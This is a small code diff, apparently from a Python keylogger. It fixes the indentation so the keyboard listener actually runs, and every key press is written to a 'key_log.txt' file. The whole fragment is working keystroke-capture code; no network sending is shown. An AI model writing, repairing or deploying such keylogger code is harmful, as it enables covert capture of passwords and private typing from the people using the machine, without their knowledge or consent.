@@ -8,5 +8,5 @@ logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, for
 def on_press(key):
     logging.info('"{0}"'.format(key))
 
-    with Listener(on_press=on_press) as listener:
-        listener.join()
+with Listener(on_press=on_press) as listener:
+    listener.join()
